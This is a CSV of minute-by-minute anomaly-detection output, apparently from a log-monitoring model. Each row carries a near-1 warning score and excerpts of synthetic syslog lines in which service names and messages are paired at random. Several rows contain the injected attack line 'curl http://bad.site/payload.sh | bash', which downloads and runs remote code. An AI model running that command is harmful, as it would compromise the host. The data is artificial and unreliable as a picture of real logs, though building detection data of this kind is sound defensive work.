bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 03:21:00,0.9999997539665827,1,1,0.8224995273096307,3,61,redis-server: Rotating log files. || systemd: Listening on LVM2 poll daemon socket. || telnetd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || cups: Accepted publickey for user from 10.0.0.232 port 22 ssh2. |
2026-07-01 03:22:00,0.9999999887757728,1,1,0.8224995273096307,3,66,smartd: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || CRON: Accepted publickey for user from 10.0.0.151 port 22 ssh2. || sudo: Rotating log files. || named: Rotating log files. || sshd: Listening on L
2026-07-01 03:23:00,0.999999987784873,1,1,0.8224995273096307,3,55,ntpd: Started Session c174 of user root. || ufw: Synced RTC time from system clock. || rsyslogd: Started Session c150 of user root. || named: Accepted publickey for user from 10.0.0.188 port 22 ssh2. || named: Started Session c166 of user root. || su
2026-07-01 03:24:00,0.9998830632367404,1,1,0.8224995273096307,3,60,cups: Synced RTC time from system clock. || named: Accepted publickey for user from 10.0.0.21 port 22 ssh2. || chronyd: Accepted publickey for user from 10.0.0.80 port 22 ssh2. || kernel: Rotating log files. || xinetd: bash: -c: line 1: curl http://b
2026-07-01 03:25:00,0.9984665215770233,1,1,0.8224995273096307,3,61,ntpd: Rotating log files. || unattended-upgrades: Synced RTC time from system clock. || chronyd: Rotating log files. || logrotate: Rotating log files. || smartd: Synced RTC time from system clock. || NetworkManager: Synced RTC time from system clock.
2026-07-01 03:26:00,0.9999065168443149,1,1,0.8224995273096307,3,61,kernel: Started Session c103 of user root. || sudo: Started Session c25 of user root. || unattended-upgrades: Synced RTC time from system clock. || systemd: Synced RTC time from system clock. || sudo: Accepted publickey for user from 10.0.0.250 port 
2026-07-01 03:27:00,0.9999721072898473,1,1,0.8224995273096307,3,60,telnetd: Started CUPS Scheduler. || sudo: Started Session c46 of user root. || cups: Accepted publickey for user from 10.0.0.106 port 22 ssh2. || systemd-timesyncd: Rotating log files. || CRON: Started Session c123 of user root. || systemd: Started C
2026-07-01 03:28:00,0.9999336029718068,1,1,0.8224995273096307,3,63,systemd-timesyncd: Rotating log files. || dockerd: Started Cleanup of Temporary Directories. || rsyslogd: Finished Daily apt download activities. || sudo: Started Session c250 of user root. || systemd-timesyncd: Finished Daily apt download activities
2026-07-01 03:29:00,0.9990223725015552,1,1,0.8224995273096307,3,61,sshd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || rsyslogd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.193 port 22 ssh2. || redis-server: Started CUPS Sc
2026-07-01 03:30:00,0.9994277452126784,1,1,0.8224995273096307,3,62,cups: Rotating log files. || kernel: Rotating log files. || systemd-timesyncd: Started Session c180 of user root. || dockerd: Started Cleanup of Temporary Directories. || CRON: Rotating log files. || smartd: Started Cleanup of Temporary Directories. 
2026-07-01 03:31:00,0.9998757692026666,1,1,0.8224995273096307,3,61,NetworkManager: Rotating log files. || CRON: Listening on LVM2 poll daemon socket. || gpm: Started Cleanup of Temporary Directories. || ftpd: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || chronyd: Listening on LVM2 po
2026-07-01 03:32:00,0.9981163426872603,1,1,0.8224995273096307,3,59,sudo: Accepted publickey for user from 10.0.0.254 port 22 ssh2. || named: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || sshd: Finished Daily apt download activities. || ftpd: Started Session c229 of use
2026-07-01 03:33:00,0.9999994332686187,1,1,0.8224995273096307,3,64,ntpd: Started CUPS Scheduler. || CRON: Started Session c65 of user root. || named: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || chronyd: Accepted publickey for user from 10.0.0.233 port 22 ssh2. || telnetd
2026-07-01 03:34:00,0.9999999144376144,1,1,0.8224995273096307,3,61,ntpd: Rotating log files. || kernel: Rotating log files. || telnetd: Started Session c19 of user root. || ftpd: Synced RTC time from system clock. || sudo: Listening on LVM2 poll daemon socket. || kernel: Accepted publickey for user from 10.0.0.25 po
2026-07-01 03:35:00,0.999996737884328,1,1,0.8224995273096307,3,60,cups: Accepted publickey for user from 10.0.0.39 port 22 ssh2. || ufw: Started CUPS Scheduler. || cups: Rotating log files. || logrotate: Started Session c131 of user root. || ftpd: Started Session c101 of user root. || logrotate: Accepted publickey 
2026-07-01 03:36:00,0.9999995137600186,1,1,0.8224995273096307,3,58,telnetd: Rotating log files. || sudo: Listening on LVM2 poll daemon socket. || named: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt download activities. || CRON: Failed password for invalid user test from 192.168.1.43866 port 22 s
2026-07-01 03:37:00,0.9999999920656398,1,1,0.8224995273096307,3,61,kernel: Rotating log files. || gpm: Listening on LVM2 poll daemon socket. || unix_chkpwd: Rotating log files. || gpm: Started CUPS Scheduler. || CRON: Rotating log files. || systemd-timesyncd: Accepted publickey for user from 10.0.0.219 port 22 ssh2.
2026-07-01 03:38:00,0.9999999881948783,1,1,0.8224995273096307,3,60,unattended-upgrades: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || unattended-upgrades: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || smartd: Started Cleanup of Temporary Directories. || named: Started CUPS Sched
2026-07-01 03:39:00,0.9999996142591072,1,1,0.8224995273096307,3,57,xinetd: Accepted publickey for user from 10.0.0.96 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || ftpd: Started Session c119 of user root. || systemd: Synced RTC time from system clock. || NetworkManager: kernel: Kernel panic -
2026-07-01 03:40:00,0.9999957034317073,1,1,0.8224995273096307,3,58,systemd-timesyncd: Rotating log files. || telnetd: Accepted publickey for user from 10.0.0.208 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || sshd: Rotating log files. || smartd: Started Session c161 of user root. || unattended-upgrades: Finis
2026-07-01 03:41:00,0.9999733318599164,1,1,0.8224995273096307,3,61,ftpd: Finished Daily apt download activities. || sshd: Started Cleanup of Temporary Directories. || ftpd: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || sshd: Rotating log files. || telnetd: Synced RT
2026-07-01 03:42:00,0.9999894260841581,1,1,0.8224995273096307,3,60,ufw: Started Session c96 of user root. || xinetd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || gpm: Started Session c35 of user root. || systemd-timesyncd: Accepted publickey for user from 1
2026-07-01 03:43:00,0.9999966265938395,1,1,0.8224995273096307,3,61,unattended-upgrades: Finished Daily apt download activities. || unix_chkpwd: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || unix_chkpwd: Finished Daily apt download activities. || cups:
2026-07-01 03:44:00,0.9999534744590688,1,1,0.8224995273096307,3,64,ufw: Started Cleanup of Temporary Directories. || kernel: Started Session c150 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || ntpd: Accepted publickey for user from 10.0.0.124 port 22 ssh2. || unattended-upgrades: Started CUP
2026-07-01 03:45:00,0.9999820659459613,1,1,0.8224995273096307,3,64,xinetd: Synced RTC time from system clock. || telnetd: Started Cleanup of Temporary Directories. || smartd: Finished Daily apt download activities. || systemd-timesyncd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || ntpd: Synced RTC tim
2026-07-01 03:46:00,0.9999979003712662,1,1,0.8224995273096307,3,59,cups: Started Session c117 of user root. || gpm: kernel: Out of memory: Kill process 27974 (python3) score 987 or sacrifice child || rsyslogd: Rotating log files. || logrotate: Rotating log files. || NetworkManager: Listening on LVM2 poll daemon sock
2026-07-01 03:47:00,0.9999907769390047,1,1,0.8224995273096307,3,60,logrotate: Listening on LVM2 poll daemon socket. || named: Rotating log files. || smartd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.50422 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || ftpd: Rotating log files. || redis-server: kernel: Kernel panic -
2026-07-01 03:48:00,0.9999998798786163,1,1,0.8224995273096307,3,61,smartd: Synced RTC time from system clock. || ftpd: Started Session c22 of user root. || sudo: Started CUPS Scheduler. || chronyd: Rotating log files. || unix_chkpwd: Started Session c211 of user root. || unattended-upgrades: Synced RTC time from sys
2026-07-01 03:49:00,0.9999999400305688,1,1,0.8224995273096307,3,59,xinetd: Rotating log files. || NetworkManager: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || redis-server: Started Cleanup of Temporary Directories. || logrotate: Started CUPS Scheduler. || gpm: Listening on LVM2 poll daem
2026-07-01 03:50:00,0.999998985188999,1,1,0.8224995273096307,3,56,redis-server: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || sudo: Started CUPS Scheduler. || named: Started CUPS Scheduler. || unix_chkpwd: Rotating log files. || systemd-timesyncd: Started Cleanup of Temporary Directories
2026-07-01 03:51:00,0.9999991360717625,1,1,0.8224995273096307,3,55,gpm: Started Session c167 of user root. || docker: Synced RTC time from system clock. || unix_chkpwd: Rotating log files. || docker: Rotating log files. || ftpd: Listening on LVM2 poll daemon socket. || sudo: Synced RTC time from system clock. || doc
2026-07-01 03:52:00,0.9999945189684892,1,1,0.8224995273096307,3,58,NetworkManager: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || systemd: Accepted publickey for user from 10.0.0.188 port 22 ssh2. || ufw: Accepted publickey for user from 10.0.0.179 port 22 ssh2. || sshd: Started Cleanu
2026-07-01 03:53:00,0.9998738487675927,1,1,0.8224995273096307,3,57,logrotate: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.179 port 22 ssh2. || redis-server: Finished Daily apt download activities. || NetworkManager: Started Cleanup of Temporary Directories. || smartd:
2026-07-01 03:54:00,0.9998463247536473,1,1,0.8224995273096307,3,59,named: Started CUPS Scheduler. || ntpd: Rotating log files. || ftpd: Started Session c71 of user root. || sudo: Synced RTC time from system clock. || chronyd: Started Session c60 of user root. || logrotate: Started CUPS Scheduler. || systemd: Accepte
2026-07-01 03:55:00,0.9999993364785238,1,1,0.8224995273096307,3,59,unix_chkpwd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || ftpd: Finished Daily apt download activities. || named: Started Cleanup of Temporary Directories.
2026-07-01 03:56:00,0.9999998911242735,1,1,0.8224995273096307,3,59,cups: Listening on LVM2 poll daemon socket. || chronyd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Listening on LVM2 poll daemon socket. || systemd: Started Session c242 of user root. || smartd: Started CUPS Scheduler. || unix_chkpwd: Rota
2026-07-01 03:57:00,0.9998907692803831,1,1,0.8224995273096307,3,58,logrotate: Started Session c226 of user root. || systemd-timesyncd: Started Session c45 of user root. || cups: Started Cleanup of Temporary Directories. || systemd: Listening on LVM2 poll daemon socket. || NetworkManager: Rotating log files. || gpm: 
2026-07-01 03:58:00,0.9995074761150203,1,1,0.8224995273096307,3,59,systemd-timesyncd: Rotating log files. || ntpd: Started CUPS Scheduler. || redis-server: Started Session c225 of user root. || NetworkManager: kernel: Out of memory: Kill process 26475 (python3) score 987 or sacrifice child || xinetd: Started CUPS Sc
2026-07-01 03:59:00,0.9998733258572674,1,1,0.8224995273096307,3,58,sudo: Listening on LVM2 poll daemon socket. || cups: Started CUPS Scheduler. || sudo: Finished Daily apt download activities. || kernel: Rotating log files. || telnetd: kernel: Out of memory: Kill process 14843 (python3) score 987 or sacrifice child 
2026-07-01 04:00:00,0.9999961494396296,1,1,0.8224995273096307,3,63,smartd: Listening on LVM2 poll daemon socket. || gpm: bash: -c: line 1: curl http://bad.site/payload.sh | bash || smartd: Accepted publickey for user from 10.0.0.177 port 22 ssh2. || sudo: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started
2026-07-01 04:01:00,0.9983545499263021,1,1,0.8224995273096307,3,60,unix_chkpwd: Started Session c138 of user root. || xinetd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || xinetd: Started Session c104 of user root. || ntpd: Started Cleanup of Temporary Directorie
2026-07-01 04:02:00,0.989026732745337,1,1,0.8224995273096307,3,61,ftpd: Finished Daily apt download activities. || systemd: Started CUPS Scheduler. || ftpd: Rotating log files. || named: Rotating log files. || logrotate: Started Session c169 of user root. || chronyd: Accepted publickey for user from 10.0.0.183 port
2026-07-01 04:03:00,0.9996955317758691,1,1,0.8224995273096307,3,61,unattended-upgrades: Accepted publickey for user from 10.0.0.205 port 22 ssh2. || systemd: Started CUPS Scheduler. || kernel: Started Cleanup of Temporary Directories. || xinetd: Synced RTC time from system clock. || smartd: Accepted publickey for us
2026-07-01 04:04:00,0.9999728471856293,1,1,0.8224995273096307,3,59,ntpd: Started CUPS Scheduler. || smartd: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. || unattended-upgrades: Synced RTC time from system clock. || telnetd: Synced RTC time from system clock. || CRON: Synced RTC time from syste
2026-07-01 04:05:00,0.9995454998866214,1,1,0.8224995273096307,3,62,gpm: Synced RTC time from system clock. || systemd: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.3 port 22 ssh2. || xinetd: Accepted publickey for user from 10.0.0.227 port 22 ssh2. || logrotate: Rota
2026-07-01 04:06:00,0.9651211528155289,1,1,0.8224995273096307,3,61,sudo: Finished Daily apt download activities. || rsyslogd: Rotating log files. || dockerd: Started CUPS Scheduler. || xinetd: Finished Daily apt download activities. || unix_chkpwd: Finished Daily apt download activities. || ufw: Rotating log files. 
2026-07-01 04:07:00,0.9796989110379472,1,1,0.8224995273096307,3,58,rsyslogd: Started CUPS Scheduler. || systemd-timesyncd: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || docker: Listening on LVM2 poll daemon socket. || named: Synced RTC time from system clock. || chronyd:
2026-07-01 04:08:00,0.999792646433427,1,1,0.8224995273096307,3,63,logrotate: Listening on LVM2 poll daemon socket. || CRON: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || redis-server: Accepted publickey for user from 10.0.0.119 port 22 ssh2. || sshd: Started Ses
2026-07-01 04:09:00,0.999919146342579,1,1,0.8224995273096307,3,57,sshd: Accepted publickey for user from 10.0.0.41 port 22 ssh2. || telnetd: Started Session c207 of user root. || docker: Synced RTC time from system clock. || cups: Started CUPS Scheduler. || ftpd: Listening on LVM2 poll daemon socket. || smartd: Sta
2026-07-01 04:10:00,0.9958495414667137,1,1,0.8224995273096307,3,59,sudo: Synced RTC time from system clock. || NetworkManager: Rotating log files. || xinetd: Synced RTC time from system clock. || xinetd: Synced RTC time from system clock. || systemd-timesyncd: Accepted publickey for user from 10.0.0.128 port 22 ssh2
2026-07-01 04:11:00,0.9999097632350542,1,1,0.8224995273096307,3,57,CRON: Accepted publickey for user from 10.0.0.38 port 22 ssh2. || docker: Started Cleanup of Temporary Directories. || dockerd: Rotating log files. || telnetd: Synced RTC time from system clock. || gpm: Synced RTC time from system clock. || unix_chkp
2026-07-01 04:12:00,0.9920304190145363,1,1,0.8224995273096307,3,57,ufw: Started Session c20 of user root. || ntpd: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || logrotate: Rotating log files. || NetworkManager: Finished Daily apt download activities. |
2026-07-01 04:13:00,0.9776673749121771,1,1,0.8224995273096307,3,58,systemd-timesyncd: Synced RTC time from system clock. || gpm: Listening on LVM2 poll daemon socket. || systemd: Started Session c158 of user root. || smartd: Accepted publickey for user from 10.0.0.85 port 22 ssh2. || rsyslogd: Started CUPS Scheduler
2026-07-01 04:14:00,0.999769421500121,1,1,0.8224995273096307,3,60,telnetd: Started Session c70 of user root. || gpm: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || docker: Rotating log files. || sshd: Finished Daily apt download activities. || docker: Synced RTC time from 
2026-07-01 04:15:00,0.9995787937022554,1,1,0.8224995273096307,3,60,cups: Synced RTC time from system clock. || NetworkManager: Started Cleanup of Temporary Directories. || kernel: Started CUPS Scheduler. || gpm: Rotating log files. || telnetd: Synced RTC time from system clock. || unattended-upgrades: Started Cleanu
2026-07-01 04:16:00,0.999933024282925,1,1,0.8224995273096307,3,59,unix_chkpwd: Accepted publickey for user from 10.0.0.91 port 22 ssh2. || systemd: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || dockerd: Synced RTC time from system clock. || unattended-upgrades: [UFW BLOCK] IN=eth0
2026-07-01 04:17:00,0.99987225022364,1,1,0.8224995273096307,3,63,unix_chkpwd: Synced RTC time from system clock. || unix_chkpwd: Synced RTC time from system clock. || unattended-upgrades: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || redis-server: Rotating log files. || systemd-timesyncd: Finished 
2026-07-01 04:18:00,0.9998178068855843,1,1,0.8224995273096307,3,62,ntpd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || ufw: Finished Daily apt download activities. || ftpd: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || named: Listening on LVM2 poll daemon so
2026-07-01 04:19:00,0.9995308202051484,1,1,0.8224995273096307,3,58,unattended-upgrades: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.75 port 22 ssh2. || xinetd: Started CUPS Scheduler. || cups: Started CUPS Scheduler. || docker: Rotating log files. || rsyslogd: Start
2026-07-01 04:20:00,0.9999902365134006,1,1,0.8224995273096307,3,60,NetworkManager: Started Session c166 of user root. || telnetd: Rotating log files. || docker: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started Session c27 of user root. || sshd: EXT4-fs error (device sda1): ext4_find_entry:1455: 
2026-07-01 04:21:00,0.9999974486429635,1,1,0.8224995273096307,3,60,docker: Synced RTC time from system clock. || logrotate: Started Session c72 of user root. || telnetd: Started Cleanup of Temporary Directories. || CRON: Accepted publickey for user from 10.0.0.214 port 22 ssh2. || telnetd: Started CUPS Scheduler. ||
2026-07-01 04:22:00,0.9997145639059967,1,1,0.8224995273096307,3,59,smartd: Started CUPS Scheduler. || kernel: Synced RTC time from system clock. || systemd: Accepted publickey for user from 10.0.0.85 port 22 ssh2. || systemd: Started CUPS Scheduler. || systemd-timesyncd: Started Session c97 of user root. || unix_chk
2026-07-01 04:23:00,0.9999674561764328,1,1,0.8224995273096307,3,58,systemd-timesyncd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Accepted publickey for user from 10.0.0.240 port 22 ssh2. || sudo: Started Session c21 of user root. || NetworkManager: Finished Daily apt download activities. || named: F
2026-07-01 04:24:00,0.9999999945837361,1,1,0.8224995273096307,3,60,ntpd: Started Cleanup of Temporary Directories. || telnetd: Accepted publickey for user from 10.0.0.82 port 22 ssh2. || chronyd: Finished Daily apt download activities. || ufw: Finished Daily apt download activities. || systemd-timesyncd: Synced RTC 
2026-07-01 04:25:00,0.9999997218203073,1,1,0.8224995273096307,3,63,sudo: Finished Daily apt download activities. || unix_chkpwd: Finished Daily apt download activities. || redis-server: Started Session c205 of user root. || logrotate: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Accepted publ
2026-07-01 04:26:00,0.9982109994897469,1,1,0.8224995273096307,3,56,sudo: Started Cleanup of Temporary Directories. || cups: Listening on LVM2 poll daemon socket. || logrotate: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || unattended-upgrades: Finished Daily apt download 
2026-07-01 04:27:00,0.9996323710759674,1,1,0.8224995273096307,3,62,sudo: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || kernel: Listening on LVM2 poll daemon socket. || cups: Synced RTC time from system clock. || ftpd: Started Session c151 of user root. || xinetd:
2026-07-01 04:28:00,0.999836114296034,1,1,0.8224995273096307,3,59,sshd: Accepted publickey for user from 10.0.0.227 port 22 ssh2. || smartd: Rotating log files. || systemd: Accepted publickey for user from 10.0.0.181 port 22 ssh2. || cups: Accepted publickey for user from 10.0.0.59 port 22 ssh2. || chronyd: Finishe
2026-07-01 04:29:00,0.9999781569247121,1,1,0.8224995273096307,3,59,named: kernel: Out of memory: Kill process 16558 (python3) score 987 or sacrifice child || systemd: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || rsyslogd: Accepted publickey for user from 10.0.0.249 por
2026-07-01 04:30:00,0.9998307333424309,1,1,0.8224995273096307,3,58,cups: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || CRON: Started Session c192 of user root. || unattended-upgrades: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || unix_chkpwd: Started 
2026-07-01 04:31:00,0.9979002989199673,1,1,0.8224995273096307,3,60,ftpd: Started CUPS Scheduler. || rsyslogd: Listening on LVM2 poll daemon socket. || telnetd: Accepted publickey for user from 10.0.0.114 port 22 ssh2. || smartd: Rotating log files. || unattended-upgrades: Finished Daily apt download activities. || k
2026-07-01 04:32:00,0.9999566989971199,1,1,0.8224995273096307,3,58,NetworkManager: Finished Daily apt download activities. || docker: Rotating log files. || docker: Rotating log files. || unattended-upgrades: Listening on LVM2 poll daemon socket. || systemd: Started Cleanup of Temporary Directories. || CRON: Synced 
2026-07-01 04:33:00,0.9999930999964517,1,1,0.8224995273096307,3,60,NetworkManager: Synced RTC time from system clock. || systemd: Accepted publickey for user from 10.0.0.32 port 22 ssh2. || docker: Finished Daily apt download activities. || cups: Listening on LVM2 poll daemon socket. || unix_chkpwd: Accepted publick
2026-07-01 04:34:00,0.9999995526021962,1,1,0.8224995273096307,3,62,unix_chkpwd: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || sshd: Finished Daily apt download activities. || logrotate: Synced RTC time from system clock. || systemd: Finished Daily apt download activities. || redis-server: 
2026-07-01 04:35:00,0.9999605845145637,1,1,0.8224995273096307,3,60,xinetd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt download activities. || xinetd: Started Session c88 of user root. || redis-server: Accepted publickey for user from 10.0.0.182 port 22 ssh2. || logrotate: Started Cleanup o
2026-07-01 04:36:00,0.9988580013483226,1,1,0.8224995273096307,3,60,xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || chronyd: Accepted publickey for user from 10.0.0.156 port 22 ssh2. || telnetd: Started CUPS Scheduler. || gpm: Started CUPS Scheduler. || kern
2026-07-01 04:37:00,0.999999421023117,1,1,0.8224995273096307,3,57,unattended-upgrades: Accepted publickey for user from 10.0.0.16 port 22 ssh2. || CRON: Started Session c18 of user root. || kernel: Started Session c19 of user root. || smartd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: rea
2026-07-01 04:38:00,0.9999999837934512,1,1,0.8224995273096307,3,62,ntpd: Accepted publickey for user from 10.0.0.140 port 22 ssh2. || cups: Finished Daily apt download activities. || cups: Started Session c245 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || telnetd: Synced RTC time from sys
2026-07-01 04:39:00,0.9999998205835654,1,1,0.8224995273096307,3,61,xinetd: Started CUPS Scheduler. || gpm: Started CUPS Scheduler. || cups: Started Session c80 of user root. || systemd-timesyncd: Started Cleanup of Temporary Directories. || redis-server: Listening on LVM2 poll daemon socket. || ufw: Started Session 
2026-07-01 04:40:00,0.9999999525020511,1,1,0.8224995273096307,3,66,xinetd: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || telnetd: Rotating log files. || CRON: Accepted publickey for user from 10.0.0.233 port 22 ssh2. || ufw: Started Cleanup of Temporary Directories. || 
2026-07-01 04:41:00,0.9999999231506821,1,1,0.8224995273096307,3,61,logrotate: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Finished Daily apt download activities. || ufw: Finished Daily apt download activities. || ftpd: Finished Daily apt download activities. || systemd: Started Session c28 of user ro
2026-07-01 04:42:00,0.9999674229919401,1,1,0.8224995273096307,3,54,ufw: Started Session c197 of user root. || sshd: Accepted publickey for user from 10.0.0.97 port 22 ssh2. || chronyd: Rotating log files. || kernel: Finished Daily apt download activities. || telnetd: Finished Daily apt download activities. || redis-
2026-07-01 04:43:00,0.9998551114585882,1,1,0.8224995273096307,3,64,docker: Accepted publickey for user from 10.0.0.117 port 22 ssh2. || unix_chkpwd: Started Cleanup of Temporary Directories. || xinetd: Finished Daily apt download activities. || unix_chkpwd: Started Cleanup of Temporary Directories. || ftpd: Failed p
2026-07-01 04:44:00,0.9996903037210787,1,1,0.8224995273096307,3,62,NetworkManager: Finished Daily apt download activities. || rsyslogd: Finished Daily apt download activities. || xinetd: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || named: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.59156 DST=
2026-07-01 04:45:00,0.9971715174175761,1,1,0.8224995273096307,3,61,telnetd: Accepted publickey for user from 10.0.0.29 port 22 ssh2. || unix_chkpwd: Finished Daily apt download activities. || CRON: kernel: Out of memory: Kill process 58106 (python3) score 987 or sacrifice child || docker: Listening on LVM2 poll daem
2026-07-01 04:46:00,0.999981054916058,1,1,0.8224995273096307,3,61,redis-server: Started Session c117 of user root. || chronyd: Synced RTC time from system clock. || sudo: Started Session c44 of user root. || telnetd: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || gpm: A
2026-07-01 04:47:00,0.9999221499351924,1,1,0.8224995273096307,3,60,logrotate: Started Cleanup of Temporary Directories. || ntpd: Accepted publickey for user from 10.0.0.205 port 22 ssh2. || named: Started Session c216 of user root. || dockerd: Started CUPS Scheduler. || systemd-timesyncd: Synced RTC time from system
2026-07-01 04:48:00,0.999817609880099,1,1,0.8224995273096307,3,62,xinetd: Started Session c118 of user root. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.35459 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || kernel: Started Session c187 of user root. || ntpd: Rotating log files. || telnetd: Started Cleanup of T
2026-07-01 04:49:00,0.9998977210301603,1,1,0.8224995273096307,3,59,sudo: Started Session c157 of user root. || rsyslogd: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || systemd-timesyncd: Started CUPS Scheduler. || ftpd: Started Cleanup of Temporary Directories. || ftpd: Rotating log files. ||
2026-07-01 04:50:00,0.9972071363792651,1,1,0.8224995273096307,3,60,unix_chkpwd: Finished Daily apt download activities. || kernel: Accepted publickey for user from 10.0.0.192 port 22 ssh2. || systemd: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.250 port 22 ssh2. || 
2026-07-01 04:51:00,0.9796696410940863,1,1,0.8224995273096307,3,56,NetworkManager: Started CUPS Scheduler. || docker: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || docker: Accepted publickey for user from 10.0.0.124 port 22 ssh2. || named: Synced RTC time from system clo
2026-07-01 04:52:00,0.989538271959235,1,1,0.8224995273096307,3,61,telnetd: Listening on LVM2 poll daemon socket. || rsyslogd: kernel: Out of memory: Kill process 17992 (python3) score 987 or sacrifice child || ftpd: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || xinetd: Rotating log files.
2026-07-01 04:53:00,0.9993018962468676,1,1,0.8224995273096307,3,58,rsyslogd: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || sudo: Started Session c232 of user root. || gpm: Synced RTC time from system clock. || system
2026-07-01 04:54:00,0.9999997240106144,1,1,0.8224995273096307,3,59,ftpd: Finished Daily apt download activities. || ufw: Started CUPS Scheduler. || telnetd: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || xinetd: Rotating log files. || systemd: Started CUPS Schedule
